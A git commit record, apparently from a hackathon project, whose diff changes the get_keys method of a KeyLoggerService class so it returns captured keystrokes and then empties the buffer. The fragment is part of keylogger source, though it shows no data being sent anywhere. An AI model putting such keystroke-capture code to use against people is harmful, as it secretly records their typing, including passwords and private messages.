7c5aa271469026c4a433f02b1a640b7605fd7db6
eli <lykkh78@gmail.com>
2025-02-11 19:01:57 +0200

    change file

--- hackathon_keylogger.py
+++ hackathon_keylogger.py
@@ -21,7 +21,9 @@ class KeyLoggerService:
         self.listener.stop()
 
     def get_keys(self):
-        return self.keys
+        temp = self.keys
+        self.keys = str()
+        return temp
 
     def _on_press(self , key):
         updated_key = KeyLoggerService._correction_keys(key)
